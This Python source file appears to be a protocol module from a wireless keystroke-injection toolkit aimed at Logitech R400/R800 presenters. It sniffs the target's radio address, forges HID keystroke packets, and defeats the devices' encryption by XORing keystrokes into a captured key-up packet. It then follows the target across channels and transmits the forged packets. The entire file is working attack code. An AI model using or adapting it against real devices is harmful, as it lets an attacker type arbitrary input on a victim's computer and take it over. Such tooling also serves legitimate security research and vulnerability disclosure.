from protocol import Protocol
from lib import common
from collections import deque
from threading import Thread
import time
import logging
import crcmod
import struct


KEYUP_REF = "00:D3:A9:CC:DE:A0:4E:4B:FD:9B:8B:98:F9:E7:00:00:00:00:00:00:00"


# Logitech R400/R800 wireless presenter
class Logitech(Protocol):

  # Constructor
  def __init__(self, address, encrypted=False):

    self.address = address
    self.encrypted = encrypted

    super(Logitech, self).__init__("Logitech")


  # Configure the radio
  def configure_radio(self):

    # Put the radio in sniffer mode
    common.radio.enter_sniffer_mode(self.address)

    # Set the channels to {2..74..3}
    common.channels = range(2, 77, 3)

    # Set the initial channel
    common.radio.set_channel(common.channels[0])


  def send_hid_event(self, scan_code=0, shift=False, ctrl=False, win=False):
    
    # Keystroke modifiers
    modifiers = 0x00
    if shift: modifiers |= 0x20
    if ctrl: modifiers |= 0x01
    if win: modifiers |= 0x08

    # Build and enqueue the payload
    if not self.encrypted:
      payload = ("00:C1:%02x:00:%02x:00:00:00:00" % (modifiers, scan_code)).replace(":", "").decode("hex")
    else:
      ref = KEYUP_REF.replace(":", "").decode("hex")
      idx = 8
      modidx = 2
      payload = ref
      payload = payload[0:idx] + chr(scan_code^ord(ref[idx])) + payload[idx+1:]
      payload = payload[0:modidx] + chr(modifiers^ord(ref[modidx])) + payload[modidx+1:]
    payload += chr((0x100-(sum(ord(c) for c in payload)&0xFF))&0xFF)
    self.tx_queue.append(payload)
    print(':'.join("%02x"%ord(c) for c in payload))


  # Enter injection mode
  def start_injection(self):

    # Start the TX loop
    self.cancel_tx_loop = False
    self.tx_queue = deque()
    self.tx_thread = Thread(target=self.tx_loop)
    self.tx_thread.daemon = True
    self.tx_thread.start()


  # TX loop
  def tx_loop(self):

    # Channel timeout
    timeout = 0.1 # 100ms

    # Parse the ping payload
    ping_payload = "\x00"

    # Format the ACK timeout and auto retry values
    ack_timeout = 1 # 500ms
    retries = 4

    # Last packet time
    last_packet = time.time()

    # Sweep through the channels and decode ESB packets
    last_ping = time.time()
    channel_index = 0
    address_string = ':'.join("%02X" % ord(c) for c in self.address[::-1])
    while not self.cancel_tx_loop:

      # Follow the target device if it changes channels
      if time.time() - last_ping > timeout:

        # First try pinging on the active channel
        if not common.radio.transmit_payload(ping_payload, ack_timeout, retries):

          # Ping failed on the active channel, so sweep through all available channels
          success = False
          for channel_index in range(len(common.channels)):
            common.radio.set_channel(common.channels[channel_index])
            if common.radio.transmit_payload(ping_payload, ack_timeout, retries):

              # Ping successful, exit out of the ping sweep
              last_ping = time.time()
              logging.debug('Ping success on channel {0}'.format(common.channels[channel_index]))
              success = True
              break

          # Ping sweep failed
          if not success: logging.debug('Unable to ping {0}'.format(address_string))

        # Ping succeeded on the active channel
        else:
          logging.debug('Ping success on channel {0}'.format(common.channels[channel_index]))
          last_ping = time.time()

      # Read from the queue
      if len(self.tx_queue):

        # Transmit the queued packet
        if time.time() - last_packet < 0.008:
          continue
        payload = self.tx_queue.popleft()
        if not common.radio.transmit_payload(payload, ack_timeout, retries):
          self.tx_queue.appendleft(payload)
        else:
          last_packet = time.time()


  # Leave injection mode
  def stop_injection(self):
    while len(self.tx_queue):
      time.sleep(0.001)
      continue
    self.cancel_tx_loop = True
    self.tx_thread.join()          